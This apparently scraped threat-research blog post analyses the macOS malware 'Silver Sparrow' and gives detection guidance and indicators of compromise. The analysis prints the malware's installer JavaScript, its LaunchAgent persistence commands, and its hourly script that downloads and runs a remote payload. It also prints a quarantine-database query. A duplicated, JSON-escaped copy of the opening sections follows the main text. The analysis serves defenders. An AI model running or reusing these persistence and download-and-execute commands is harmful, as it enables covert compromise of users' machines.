py-16" id="sidebarContent"><p class="sidebar_navTopLabel__s2rID">Contents</p><ol><li><a class="sidebar_link__FaxhI sidebar_linkActive__0wuEc" rel="noopener" blogs</a></li></ol></div><div class="sidebar_copyUrlWrapper__Q3_KE  hidden lg:flex" style="border-bottom:none"><button type="button" class="sidebar_copyUrl__kqf9a">Copy URL</button></div><div class="sidebar_copyUrlWrapper__Q3_KE flex lg:hidden" style="border-bottom:none;border-top:none"><button type="button" class="sidebar_copyUrl__kqf9a">Copy URL</button></div></div></div></div></div></div></div></div><div class="hidden lg:block" style="margin-bottom:-0px"></div><div class="paragraph-blog-container" id="introduction"><div data-component-identifier="719556" class="paragraph-wysiwyg-module"><div class="bg-white "><div class="rebrand-container py-0"><div class="default-grid"><div class="col-span-full lg:col-start-4 wysiwyg_module_root__aa_Ec"><div class="wysiwyg_module_content__6hEig"><p dir="ltr">Silver Sparrow is an activity cluster that includes a binary compiled to run on Apple’s new M1 chips but lacks one very important feature: a payload.</p>
</div><div class="hidden"></div></div></div></div></div></div></div><div class="paragraph-blog-container" id="overview"><div data-component-identifier="719566" class="paragraph-wysiwyg-module"><div class="bg-white "><div class="rebrand-container py-0"><div class="default-grid"><div class="col-span-full lg:col-start-4 wysiwyg_module_root__aa_Ec"><div class="wysiwyg_module_content__6hEig"><p dir="ltr">UPDATE on 05/21/2021: A previous version of this blog stated that, “…Silver Sparrow had infected 29,139 macOS endpoints….” We have updated it to state that the Silver Sparrow activity cluster affected 29,139 macOS endpoints. This distinction may seem small, but it’s important because the Silver Sparrow activity cluster comprises multiple artifacts, including clearly malicious files and unusual or suspicious ones too. One file we chose to include in the cluster is the `._insu` file that seems to instruct the malware to remove itself from an endpoint. A subset of those 29,139 machines were infected by one of the two malicious packages described in this blog, while the majority contained the `._insu` file check and were therefore affected by the overall Silver Sparrow activity cluster as we define it. Other teams may cluster this activity differently based on their assessments.</p><p dir="ltr">Earlier this month, Red Canary detection engineers Wes Hurd and <a href="/author/jason-killam">Jason Killam</a> came across a strain of macOS malware using a <a href="https://attack.mitre.org/techniques/T1543/001/" target="_blank">LaunchAgent</a> to establish persistence. Nothing new there. However, our investigation almost immediately revealed that this malware, whatever it was, did not exhibit the behaviors that we’ve come to expect from the usual adware that so often targets macOS systems. The novelty of this downloader arises primarily from the way it uses JavaScript for execution—something we hadn’t previously encountered in other macOS malware—and the emergence of a related binary compiled for Apple’s new <a href="https://www.apple.com/mac/m1/" target="_blank">M1 ARM64 architecture</a>.</p><p dir="ltr">We’ve dubbed this activity cluster “Silver Sparrow.”</p><p dir="ltr"><a href="https://redcanary.com/threat-detection-report/threats/field-guide/" target="_blank"></a></p><p> </p><img src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2025/03/FieldGuideBanner.png" class="align-center" alt="Image" loading="lazy" decoding="async"/><p dir="ltr">Thanks to contributions from <a href="https://twitter.com/gutterchurl" target="_blank">Erika Noerenberg</a> and <a href="https://twitter.com/thomasareed" target="_blank">Thomas Reed</a> from <a href="https://blog.malwarebytes.com/" target="_blank">Malwarebytes</a> and <a href="https://twitter.com/AstleJimmy" target="_blank">Jimmy Astle</a> from <a href="https://www.carbonblack.com/blog/" target="_blank">VMware Carbon Black</a>, we quickly realized that we were dealing with what appeared to be a previously undetected strain of malware.</p><p dir="ltr">According to data provided by Malwarebytes, the Silver Sparrow activity cluster affected 29,139 macOS endpoints across 153 countries as of February 17, including high volumes of detection in the United States, the United Kingdom, Canada, France, and Germany.</p><p dir="ltr">Though we haven’t observed Silver Sparrow delivering additional malicious payloads yet, its forward-looking M1 chip compatibility, global reach, relatively high infection rate, and operational maturity suggest Silver Sparrow is a reasonably serious threat, uniquely positioned to deliver a potentially impactful payload at a moment’s notice. Given these causes for concern, in the spirit of transparency, we wanted to share everything we know with the broader infosec industry sooner rather than later.</p><p dir="ltr">The rest of this post will be organized into the following sections:</p><ul><li>A technical analysis of two Silver Sparrow malware samples</li><li>An explanation of intelligence gaps and blindspots</li><li>Guidance on detection opportunities for Silver Sparrow</li><li>A list of indicators that we’ve encountered while investigating this threat</li></ul><p> </p><h2>Technical analysis</h2><p> </p><h3>What we analyzed</h3><p dir="ltr">Our investigation uncovered two versions of Silver Sparrow malware, which we will refer to as “version 1” and “version 2” throughout this post (see the Indicators of Compromise section for a summary of indicators surrounding these two samples):</p><ul><li>Malware version 1 File name: updater.pkg (installer package for v1) MD5: 30c9bc7d40454e501c358f77449071aa <a href="https://www.virustotal.com/gui/file/1decb4070db4dfe5d68ba502cf3a67de96a69ea6f3acfa4454795f96472ccc0d/details" target="_blank">VirusTotal sample</a></li><li>Malware version 2 File name: update.pkg (installer package for v2) MD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149 <a href="https://www.virustotal.com/gui/file/c7dd06b20b64b64d3b155b6b77c2778a08ef6a6c0396d7537af411258e57af1e/details" target="_blank">VirusTotal sample</a></li></ul><p dir="ltr">Outside of a change in download URLs and script comments, the two versions had only one major difference. The first version contained a Mach-O binary compiled for Intel x86_64 architecture only (<code>updater</code> MD5: c668003c9c5b1689ba47a431512b03cc). In the second version, the adversary included a Mach-O binary compiled for both Intel x86_64 and M1 ARM64 architectures (<code>tasker</code> MD5: b370191228fef82635e39a137be470af). This is significant because the M1 ARM64 architecture is young, and <a href="https://objective-see.com/blog/blog_0x62.html" target="_blank">researchers have uncovered very few threats for the new platform</a>.</p><p dir="ltr">As we’ll explain in detail in the technical analysis, the Mach-O compiled binaries don’t seem to do all that much—at least not as of this writing—and so we’ve been calling them “bystander binaries.” The following image represents a high-level look at the two versions of Silver Sparrow malware.</p><img src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2021/02/Screen-Shot-2021-02-18-at-4.55.37-PM.png" class="align-center" alt="Image" loading="lazy" decoding="async"/><p> </p><h3>JavaScript in the installer</h3><p dir="ltr">We’ve found that many macOS threats are distributed through <a href="https://blog.confiant.com/confiant-malwarebytes-uncover-steganography-based-ad-payload-that-drops-shlayer-trojan-on-mac-cd31e885c202" target="_blank">malicious advertisements as single</a>, self-contained installers in <a href="https://en.wikipedia.org/wiki/Installer_(macOS)" target="_blank">PKG</a> or <a href="https://en.wikipedia.org/wiki/Apple_Disk_Image" target="_blank">DMG</a> form, masquerading as a legitimate application—such as Adobe Flash Player—or as updates. In this case, however, the adversary distributed the malware in two distinct packages: <code>updater.pkg</code> and <code>update.pkg</code>. Both versions use the same techniques to execute, differing only in the compilation of the bystander binary.</p><p dir="ltr">In order of appearance, the first novel and noteworthy thing about Silver Sparrow is that its installer packages leverage the macOS Installer JavaScript API to execute suspicious commands. While we’ve observed legitimate software doing this, this is the first instance we’ve observed it in malware. This is a deviation from behavior we usually observe in malicious macOS installers, which <a href="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/" target="_blank">generally use preinstall or postinstall scripts to execute commands</a> . In preinstall and postinstall cases, the installation generates a particular telemetry pattern that tends to look something like the following:</p><ul><li>Parent process: <code>package_script_service</code></li><li>Process: <code>bash</code>, <code>zsh</code>, <code>sh</code>, Python, or another interpreter</li><li>Command line: contains <code>preinstall</code> or <code>postinstall</code></li></ul><p dir="ltr">This telemetry pattern isn’t a particularly high-fidelity indicator of maliciousness on its own because even legitimate software uses the scripts, but it does reliably identify installers using preinstall and postinstall scripts in general. Silver Sparrow differs from what we expect to see from malicious macOS installers by including JavaScript commands within the package file’s Distribution definition XML file. This produces a different telemetry pattern:</p><ul><li>Parent process: <code>Installer</code></li><li>Process: <code>bash</code></li></ul><p dir="ltr">As with preinstall and postinstall scripts, this telemetry pattern isn’t enough to identify malicious behavior on its own. Preinstall and postinstall scripts include command-line arguments that offer clues into what’s actually getting executed. The malicious JavaScript commands, on the other hand, run using the legitimate macOS Installer process and offer very little visibility into the contents of the installation package or how that package uses the JavaScript commands.</p><p dir="ltr">The entry point to the code lives within the package’s <code>Distribution</code> definition XML file, which contains an installation-check tag specifying what function to execute during the “<a href="https://developer.apple.com/library/archive/documentation/DeveloperTools/Reference/DistributionDefinitionRef/Chapters/Distribution_XML_Ref.html#//apple_ref/doc/uid/TP40005370-CH100-SW12" target="_blank">Installation Check</a>” phase:</p><p dir="ltr">The installer used three JavaScript functions for all the heavy lifting inside the “installation_check()” function :</p><pre><code class="language-plaintext">function bash(command) { system.run(&#x27;/bin/bash&#x27;, &#x27;-c&#x27;, command) } function appendLine(line, file) { bash(`printf &#x27;%b\n&#x27; &#x27;${line}&#x27; &gt;&gt; ${file}`) } function appendLinex(line, file) { bash(`&#x27;echo&#x27; ${line} &gt;&gt; ${file}`) } function appendLiney(line, file) { bash(`printf &#x27;%b&#x27; &#x27;${line}&#x27; &gt;&gt; ${file}`) } </code></pre> <p dir="ltr">Note that in the code above, Silver Sparrow uses Apple’s <code>system.run</code> command for execution. Apple <a href="https://developer.apple.com/documentation/installer_js/system/1812364-run" target="_blank">documented</a> the <code>system.run</code> code as launching “a given program in the Resources directory of the installation package,” but it’s not limited to using the Resources directory. As observed with Silver Sparrow, you can provide the full path to a process for execution and its arguments. By taking this route, the malware causes the installer to spawn multiple <code>bash</code> processes that it can then use to accomplish its objectives.</p><p dir="ltr">The functions <code>appendLine</code>, <code>appendLinex</code>, and <code>appendLiney</code> extend the <code>bash</code> commands with arguments that write input to files on disk. Silver Sparrow writes each of its components out line by line with JavaScript commands:</p><pre><code class="language-bash">appendLine(`initTime=\$1`, updaterMonitorPath) appendLine(`/usr/bin/curl ${url} &gt; /tmp/version.json`, updaterMonitorPath) appendLine(`plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist`, updaterMonitorPath) appendLine(`wait=$(/usr/libexec/PlistBuddy -c &#x27;Print :dls&#x27; /tmp/version.plist)`, updaterMonitorPath) appendLine(`wait=\$((\$wait* 60 ))`, updaterMonitorPath) appendLine(`instVersion=1`, updaterMonitorPath)</code></pre> <p dir="ltr">This approach may avoid simple static signatures by dynamically generating the script rather than using a static script file. In addition, the commands let the adversary quickly modify the code to be much more versatile should they decide to make a change. Altogether, it means the adversary was likely attempting to evade detection and ease development.</p><p dir="ltr">Once all the commands get written, two new scripts exist on disk: <code>/tmp/agent.sh</code> and <code>~/Library/Application Support/verx_updater/verx.sh</code>. The <code>agent.sh</code> script executes immediately at the end of the installation to contact an adversary-controlled system and indicate that installation occurred. The <code>verx.sh</code> script executes periodically because of a persistent LaunchAgent to contact a remote host for more information.</p><h3>Everyone needs a (Plist)Buddy</h3><p dir="ltr">Our initial indication of malicious activity was the <code>PlistBuddy</code> process creating a LaunchAgent, so let’s explore the significance of that.</p><p dir="ltr">LaunchAgents provide a way to instruct <code>launchd</code>, the macOS initialization system, to periodically or automatically execute tasks. They can be written by any user on the endpoint, but they will usually also execute as the user that writes them. For example, if the user <code>tlambert</code> writes <code>~/Library/LaunchAgents/evil.plist</code> the tasks described in <code>evil.plist</code> will usually execute as <code>tlambert</code>. For more information, refer to <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html" target="_blank">Apple’s documentation</a>.</p><p dir="ltr">While tools like <a href="https://osquery.io/schema/4.6.0/#launchd" target="_blank">osquery</a> and antimalware controls have excellent visibility into the contents of LaunchAgents, some endpoint detection and response (EDR) tools have a hard time gaining visibility into LaunchAgents. EDR tooling tends to rely on process monitoring that offers a great deal of visibility into the creation—but not necessarily the contents—of a file. For example, an EDR tool might offer you the following shell command:</p><p dir="ltr">cp /Volumes/TotesLegit.app/Resources/launcher.plist ~/Library/LaunchAgents/launcher.plist</p><p dir="ltr">As a result, detecting a persistence mechanism in the form of a malicious LaunchAgent can be extremely difficult using EDR alone because it requires you to analyze surrounding activity to make a decision about the installer itself. In other words: you know that the LaunchAgent can be used as a persistence mechanism, but—since you might not be able to see the contents of the LaunchAgent file—you have to rely on context to determine the intent of that LaunchAgent.</p><p dir="ltr">Thankfully, there are multiple ways to create property lists (plists) on macOS, and sometimes adversaries use different methods to achieve their needs. One such way is through <code>PlistBuddy</code>, a built-in tool that allows you to create various property lists on an endpoint, including LaunchAgents. Sometimes adversaries turn to <code>PlistBuddy</code> to establish persistence, and doing so enables defenders to readily inspect the contents of a LaunchAgent using EDR because all the properties of the file get shown on the command line before writing. In Silver Sparrow’s case, we observed commands writing the content of the plist:</p><pre><code class="language-plaintext">PlistBuddy -c &#x27;Add :Label string init_verx&#x27; ~/Library/Launchagents/init_verx.plist PlistBuddy -c &#x27;Add :RunAtLoad bool true&#x27; ~/Library/Launchagents/init_verx.plist PlistBuddy -c &#x27;Add :StartInterval integer 3600&#x27; ~/Library/Launchagents/init_verx.plist PlistBuddy -c &#x27;Add :ProgramArguments array&#x27; ~/Library/Launchagents/init_verx.plist PlistBuddy -c &#x27;Add :ProgramArguments:0 string &#x27;/bin/sh&#x27;&#x27; ~/Library/Launchagents/init_verx.plist PlistBuddy -c &#x27;Add :ProgramArguments:1 string -c&#x27; ~/Library/Launchagents/init_verx.plist</code></pre> <p dir="ltr">In its final form on disk, the LaunchAgent Plist XML will resemble the following:</p><p dir="ltr"> Label init_verx RunAtLoad true StartInterval 3600 ProgramArguments &#x27;/bin/sh&#x27; -c &#x27;~/Library/Application\\ Support/verx_updater/verx.sh&#x27; [timestamp] [data from plist downloaded] 1 </p><p> </p><h3>Command and control (C2)</h3><p dir="ltr">Every hour, the persistence LaunchAgent tells <code>launchd</code> to execute a shell script that downloads a JSON file to disk, converts it into a plist, and uses its properties to determine further actions.</p><pre><code class="language-bash">curl hxxps://specialattributes.s3.amazonaws[.]com/applications/updater/ver.json &gt; /tmp/version.json plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist ... curl $(/usr/libexec/PlistBuddy -c &#x27;Print :downloadUrl&#x27; /tmp/version.plist) --output /tmp/verx chmod 777 /tmp/verx /tmp/verx upbuchupsf </code></pre> <p dir="ltr">The structure of the downloaded version.json file looks like this:</p><pre><code class="language-plaintext">{&#x27;version&#x27;:2,&#x27;label&#x27;:&#x27;verx&#x27;,&#x27;args&#x27;:&#x27;upbuchupsf&#x27;,&#x27;dls&#x27;:4320,&#x27;run&#x27;:true,&#x27;loc&#x27;:&#x27;~\/Library\/._insu&#x27;,&#x27;downloadUrl&#x27;:&#x27;&#x27;}</code></pre> <p dir="ltr">Every hour that <code>downloadUrl</code> property gets checked for additional content to download and executes. After observing the malware for over a week, neither we nor our research partners observed a final payload, leaving the ultimate goal of Silver Sparrow activity a mystery.</p><p dir="ltr">Silver Sparrow’s use of infrastructure hosted on <a href="https://aws.amazon.com/s3/" target="_blank">AWS S3</a> is interesting because AWS offers a highly available and resilient file distribution method. The adversary can create a bucket, serve out files, and operate without worrying about the additional network administration and overhead associated with doing all of this in house. In addition, callback domains for this activity cluster leveraged domains hosted through <a href="https://www.akamai.com/us/en/resources/content-distribution-network.jsp" target="_blank">Akamai CDN</a>. This implies that the adversary likely understands cloud infrastructure and its benefits over a single server or non-resilient system. Further, the adversary that likely understands this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic. Most organizations cannot afford to block access to resources in AWS and Akamai. The decision to use AWS infrastructure further supports our assessment that this is an operationally mature adversary.</p><h3>Mysteries on mysteries</h3><p dir="ltr">In addition to the payload mystery, Silver Sparrow includes a file check that causes the removal of all persistence mechanisms and scripts. It checks for the presence of <code>~/Library/._insu</code> on disk, and, if the file is present, Silver Sparrow removes all of its components from the endpoint. Hashes reported from Malwarebytes (<code>d41d8cd98f00b204e9800998ecf8427e</code>) indicated that the <code>._insu</code> file was empty. The presence of this feature is also something of a mystery.</p><pre><code class="language-bash">if [ -f ~/Library/._insu ] then rm ~/Library/Launchagents/verx.plist rm ~/Library/Launchagents/init_verx.plist rm /tmp/version.json rm /tmp/version.plist rm /tmp/verx rm -r ~/Library/Application\\ Support/verx_updater rm /tmp/agent.sh launchctl remove init_verx</code></pre> <p dir="ltr">The <code>._insu</code> file does not appear present by default on macOS, and we currently don’t know the circumstances under which the file appears.</p><h3>The final callback</h3><p dir="ltr">At the end of the installation, Silver Sparrow executes two discovery commands to construct data for a <code>curl</code> HTTP POST request indicating that the installation occurred. One retrieves the system UUID for reporting, and the second finds more interesting information: the URL used to download the original package file.</p><p dir="ltr">By executing a sqlite3 query, the malware finds the original URL the PKG downloaded from, giving the adversary an idea of successful distribution channels. We commonly see this kind of activity with malicious adware on macOS.</p><pre><code class="language-python">sqlite3 sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* &#x27;select LSQuarantineDataURLString from LSQuarantineEvent where LSQuarantineDataURLString like “[redacted]&#x27; order by LSQuarantineTimeStamp desc&#x27;</code></pre> <p> </p><h3>Hello, World: bystander binaries</h3><p dir="ltr">The first version of Silver Sparrow malware (<code>updater.pkg</code> MD5: 30c9bc7d40454e501c358f77449071aa) that we analyzed contained an extraneous Mach-O binary (<code>updater</code> MD5: c668003c9c5b1689ba47a431512b03cc), compiled for Intel x86_64 that appeared to play no additional role in the Silver Sparrow execution. Ultimately this binary seems to have been included as placeholder content to give the PKG something to distribute outside the JavaScript execution. It simply says, “Hello, World!” (literally!)</p><img src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2021/02/image3.png" alt="Image" loading="lazy" decoding="async"/><p dir="ltr">v1 Image Credit: Erika Noerenberg</p><p dir="ltr">The second version (<code>update.pkg</code> MD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149) also included an extraneous Mach-O binary (<code>tasker</code> MD5: b370191228fef82635e39a137be470af) that was compiled to be compatible with both Intelx86_64 and M1 ARM64. Like before, this binary seems to have been included as a placeholder—this time, displaying the message “You did it!”</p><img src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2021/02/image1-1.png" alt="Image" loading="lazy" decoding="async"/><p dir="ltr">v2 Image Credit: Jimmy Astle</p><p dir="ltr">You can observe the dual architecture support from version 2 of the extraneous Mach-O binary by checking out the output of <code>file</code> command on macOS or Linux systems examining the binary:</p><p dir="ltr">tasker: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit x86_64 executable, flags:</p>] [arm64:Mach-O 64-bit arm64 executable, flags:]<p dir="ltr">By contrast, the output of the <code>file</code> command from the extraneous Mach-O binary in version 1 would look like the following:</p>updater: Mach-O 64-bit x86_64 executable, flags:<p> </p><h3>Timeline</h3><p dir="ltr">We don’t have a complete picture of exactly when Silver Sparrow first emerged, but we’ve been able to construct the following timeline through a mix of open source intelligence and Red Canary telemetry:</p><ol><li>August 18, 2020: Malware version 1 (non-M1 version) callback domain <code>api.mobiletraits[.]com</code> created (<a href="https://community.riskiq.com/search/api.mobiletraits.com/whois" target="_blank">source</a>)</li><li>August 31, 2020: Malware version 1 (non-M1 version) submitted to VirusTotal (<a href="https://www.virustotal.com/gui/file/1decb4070db4dfe5d68ba502cf3a67de96a69ea6f3acfa4454795f96472ccc0d/submissions" target="_blank">source</a>)</li><li>September 2, 2020: <code>version.json</code> file seen during malware version 2 execution submitted to VirusTotal (<a href="https://www.virustotal.com/gui/file/fe3dfc11884801b6d1d331fb85f8ef822d8d4ecf329d9e71048b87b93bafe01b/details" target="_blank">source</a>)</li><li>December 5, 2020: Malware version 2 (M1 version) callback domain created <code>api.specialattributes[.]com</code> created (<a href="https://community.riskiq.com/search/api.specialattributes.com/whois" target="_blank">source</a>)</li><li>January 22, 2021: PKG file version 2 (containing a M1 binary) submitted to VirusTotal (<a href="https://www.virustotal.com/gui/file/c7dd06b20b64b64d3b155b6b77c2778a08ef6a6c0396d7537af411258e57af1e/details" target="_blank">source</a>)</li><li>January 26, 2021: Red Canary detects Silver Sparrow malware version 1</li><li>February 9, 2021: Red Canary detects Silver Sparrow malware version 2 (M1 version)</li></ol><p> </p><h2>Intelligence gaps</h2><p dir="ltr">At the time of publishing, we’ve identified a few unknown factors related to Silver Sparrow that we either don’t have visibility into or simply enough time hasn’t passed to observe. First, we aren’t certain of the initial distribution method for the PKG files. We suspect that malicious search engine results direct victims to download the PKGs based on network connections from a victim’s browser shortly before download. In this case we can’t be certain because we don’t have the visibility to determine exactly what caused the download.</p><p dir="ltr">Next, we don’t know the circumstances under which <code>~/Library/._insu</code> appears. This file may be part of a toolset the adversary wishes to avoid; it may be part of the malware’s life cycle itself as a way of removing components after an objective has been met.</p><p dir="ltr">In addition, the ultimate goal of this malware is a mystery. We have no way of knowing with certainty what payload would be distributed by the malware, if a payload has already been delivered and removed, or if the adversary has a future timeline for distribution. Based on data shared with us by Malwarebytes, the nearly 30,000 affected hosts have not downloaded what would be the next or final payload.</p><p dir="ltr">Finally, the purpose of the Mach-O binary included inside the PKG files is also a mystery. Based on the data from script execution, the binary would only run if a victim intentionally sought it out and launched it. The messages we observed of “Hello, World!” or “You did it!” could indicate the threat is under development in a proof-of-concept stage or that the adversary just needed an application bundle to make the package look legitimate.</p><h2>Detection opportunities</h2><p dir="ltr">The following section includes descriptions of the analytics that have helped us detect the Silver Sparrow downloader. That said, we didn’t build these analytics specifically for the purpose of detecting Silver Sparrow, so they may be useful for detecting a wide array of macOS threats. If one of these analytics alerts you to potentially malicious activity, we recommend searching for the presence of indicators (listed below) to confirm whether you are dealing with a Silver Sparrow infection or something else.</p><ul><li>Look for a process that appears to be <code>PlistBuddy</code> executing in conjunction with a command line containing the following: <code>LaunchAgents</code> and <code>RunAtLoad</code> and <code>true</code>. This analytic helps us find multiple macOS malware families establishing LaunchAgent persistence.</li><li>Look for a process that appears to be <code>sqlite3</code> executing in conjunction with a command line that contains: <code>LSQuarantine</code>. This analytic helps us find multiple macOS malware families manipulating or searching metadata for downloaded files.</li><li>Look for a process that appears to be <code>curl</code> executing in conjunction with a command line that contains: <code>s3.amazonaws.com</code>. This analytic helps us find multiple macOS malware families using S3 buckets for distribution.</li></ul><p> </p><h2>Indicators of Compromise</h2><p> </p><h3>In Versions 1 &amp; 2</h3><p dir="ltr">~/Library/._insu (empty file used to signal the malware to delete itself) /tmp/agent.sh (shell script executed for installation callback) /tmp/version.json (file downloaded from from S3 to determine execution flow) /tmp/version.plist (version.json converted into a property list)</p><h3>Malware Version 1</h3><p dir="ltr">File name: updater.pkg (installer package for v1) MD5: 30c9bc7d40454e501c358f77449071aa</p><p dir="ltr">File name: updater (bystander Mach-O Intel binary in v1 package) MD5: c668003c9c5b1689ba47a431512b03cc</p><p dir="ltr">mobiletraits.s3.amazonaws[.]com (S3 bucket holding version.json for v1) ~/Library/Application Support/agent_updater/agent.sh (v1 script that executes every hour) /tmp/agent (file containing final v1 payload if distributed) ~/Library/Launchagents/agent.plist (v1 persistence mechanism) ~/Library/Launchagents/init_agent.plist (v1 persistence mechanism) Developer ID Saotia Seay (5834W6MYX3) – v1 bystander binary signature revoked by Apple</p><p dir="ltr">Package content and structure</p><pre><code class="language-plaintext">. ├── Distribution * └── updater.pkg ├── Bom ├── PackageInfo ├── Payload └── updater.app └── Contents ├── _CodeSignature │ └── CodeResources ├── Info.plist ├── MacOS │ └── updater * ├── PkgInfo └── Resources └── Base.lproj └── Main.storyboardc ├── Info.plist └── MainMenu.nib (*) Contains executable code </code></pre> <p> </p><h3>Malware Version 2</h3><p dir="ltr">File name: update.pkg (installer package for v2) MD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149</p><p dir="ltr">tasker.app/Contents/MacOS/tasker (bystander Mach-O Intel &amp; M1 binary in v2) MD5: b370191228fef82635e39a137be470af</p><p dir="ltr">specialattributes.s3.amazonaws[.]com (S3 bucket holding version.json for v2) ~/Library/Application Support/verx_updater/verx.sh (v2 script that executes every hour) /tmp/verx (file containing final v2 payload if distributed) ~/Library/Launchagents/verx.plist (v2 persistence mechanism) ~/Library/Launchagents/init_verx.plist (v2 persistence mechanism) Developer ID Julie Willey (MSZ3ZH74RK) – v2 bystander binary signature revoked by Apple</p><p dir="ltr">Package content and structure</p><pre><code class="language-plaintext">. ├── Distribution * └── tasker.pkg ├── Bom ├── PackageInfo ├── Payload └── tasker.app └── Contents ├── _CodeSignature │ └── CodeResources ├── Info.plist ├── MacOS │ └── tasker * ├── PkgInfo └── Resources └── Base.lproj └── Main.storyboardc ├── Info.plist └── MainMenu.nib (*) Contains executable code </code></pre> <p dir="ltr">If you’ve been tracking similar activity, we’d love to hear from you and collaborate. Contact <a href="/cdn-cgi/l/email-protection#9dfff1f2faddeff8f9fefcf3fcefe4b3fef2f0"><span class="__cf_email__" data-cfemail="a9cbc5c6cee9dbcccdcac8c7c8dbd087cac6c4">[email&#160;protected]</span></a> with any observations or questions.</p>

dir=\"ltr\"\u003eSilver Sparrow is an activity cluster that includes a binary compiled to run on Apple’s new M1 chips but lacks one very important feature: a payload.\u003c/p\u003e\n"},"fieldSidebarNavigationTitle":null,"fieldEyebrow":null}]},{"__typename":"ParagraphBlogContainer","fieldSidebarNavigationTitle":"Overview","fieldReusableParagraphs":[{"__typename":"ParagraphWysiwygModule","id":"719566","uuid":"45a0eb5f-17b5-4030-a472-795c478a56d8","fieldBody":{"__typename":"Text","processed":"\u003cp dir=\"ltr\"\u003eUPDATE on 05/21/2021: A previous version of this blog stated that, “…Silver Sparrow had infected 29,139 macOS endpoints….” We have updated it to state that the Silver Sparrow activity cluster affected 29,139 macOS endpoints. This distinction may seem small, but it’s important because the Silver Sparrow activity cluster comprises multiple artifacts, including clearly malicious files and unusual or suspicious ones too. One file we chose to include in the cluster is the `._insu` file that seems to instruct the malware to remove itself from an endpoint. A subset of those 29,139 machines were infected by one of the two malicious packages described in this blog, while the majority contained the `._insu` file check and were therefore affected by the overall Silver Sparrow activity cluster as we define it. Other teams may cluster this activity differently based on their assessments.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eEarlier this month, Red Canary detection engineers Wes Hurd and \u003ca href=\"/author/jason-killam\"\u003eJason Killam\u003c/a\u003e came across a strain of macOS malware using a \u003ca href=\"https://attack.mitre.org/techniques/T1543/001/\" target=\"_blank\"\u003eLaunchAgent\u003c/a\u003e to establish persistence. Nothing new there. However, our investigation almost immediately revealed that this malware, whatever it was, did not exhibit the behaviors that we’ve come to expect from the usual adware that so often targets macOS systems. The novelty of this downloader arises primarily from the way it uses JavaScript for execution—something we hadn’t previously encountered in other macOS malware—and the emergence of a related binary compiled for Apple’s new \u003ca href=\"https://www.apple.com/mac/m1/\" target=\"_blank\"\u003eM1 ARM64 architecture\u003c/a\u003e.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eWe’ve dubbed this activity cluster “Silver Sparrow.”\u003c/p\u003e\u003cp dir=\"ltr\"\u003e\u003ca href=\"https://redcanary.com/threat-detection-report/threats/field-guide/\" target=\"_blank\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cp\u003e \u003c/p\u003e\u003cimg src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2025/03/FieldGuideBanner.png\" class=\"align-center\" alt=\"Image\" loading=\"lazy\" decoding=\"async\"\u003e\u003cp dir=\"ltr\"\u003eThanks to contributions from \u003ca href=\"https://twitter.com/gutterchurl\" target=\"_blank\"\u003eErika Noerenberg\u003c/a\u003e and \u003ca href=\"https://twitter.com/thomasareed\" target=\"_blank\"\u003eThomas Reed\u003c/a\u003e from \u003ca href=\"https://blog.malwarebytes.com/\" target=\"_blank\"\u003eMalwarebytes\u003c/a\u003e and \u003ca href=\"https://twitter.com/AstleJimmy\" target=\"_blank\"\u003eJimmy Astle\u003c/a\u003e from \u003ca href=\"https://www.carbonblack.com/blog/\" target=\"_blank\"\u003eVMware Carbon Black\u003c/a\u003e, we quickly realized that we were dealing with what appeared to be a previously undetected strain of malware.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eAccording to data provided by Malwarebytes, the Silver Sparrow activity cluster affected 29,139 macOS endpoints across 153 countries as of February 17, including high volumes of detection in the United States, the United Kingdom, Canada, France, and Germany.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThough we haven’t observed Silver Sparrow delivering additional malicious payloads yet, its forward-looking M1 chip compatibility, global reach, relatively high infection rate, and operational maturity suggest Silver Sparrow is a reasonably serious threat, uniquely positioned to deliver a potentially impactful payload at a moment’s notice. Given these causes for concern, in the spirit of transparency, we wanted to share everything we know with the broader infosec industry sooner rather than later.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThe rest of this post will be organized into the following sections:\u003c/p\u003e\u003cul\u003e\u003cli\u003eA technical analysis of two Silver Sparrow malware samples\u003c/li\u003e\u003cli\u003eAn explanation of intelligence gaps and blindspots\u003c/li\u003e\u003cli\u003eGuidance on detection opportunities for Silver Sparrow\u003c/li\u003e\u003cli\u003eA list of indicators that we’ve encountered while investigating this threat\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e \u003c/p\u003e\u003ch2\u003eTechnical analysis\u003c/h2\u003e\u003cp\u003e \u003c/p\u003e\u003ch3\u003eWhat we analyzed\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eOur investigation uncovered two versions of Silver Sparrow malware, which we will refer to as “version 1” and “version 2” throughout this post (see the Indicators of Compromise section for a summary of indicators surrounding these two samples):\u003c/p\u003e\u003cul\u003e\u003cli\u003eMalware version 1 File name: updater.pkg (installer package for v1) MD5: 30c9bc7d40454e501c358f77449071aa \u003ca href=\"https://www.virustotal.com/gui/file/1decb4070db4dfe5d68ba502cf3a67de96a69ea6f3acfa4454795f96472ccc0d/details\" target=\"_blank\"\u003eVirusTotal sample\u003c/a\u003e\u003c/li\u003e\u003cli\u003eMalware version 2 File name: update.pkg (installer package for v2) MD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149 \u003ca href=\"https://www.virustotal.com/gui/file/c7dd06b20b64b64d3b155b6b77c2778a08ef6a6c0396d7537af411258e57af1e/details\" 